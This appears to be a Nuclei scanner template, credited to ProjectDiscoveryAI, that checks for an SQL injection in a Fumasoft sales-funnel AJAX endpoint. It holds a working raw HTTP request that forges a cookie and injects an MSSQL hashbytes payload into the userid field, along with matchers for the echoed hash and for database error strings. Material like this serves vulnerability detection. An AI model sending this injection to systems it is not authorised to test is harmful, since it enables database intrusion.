id: fumasoft-getsalesfunnel-sqli
info:
  name: Fumasoft getsalesfunnel SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /m/Dingding/Ajax/AjaxOrderManage.ashx HTTP/1.1
        Host: {{Hostname}}
        Cookie: UserCookie={"empId":"1"}
        Content-Type: application/x-www-form-urlencoded

        action=getsalesfunnel&userid='-1/sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "bfCustomers"
      - type: regex
        part: body
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
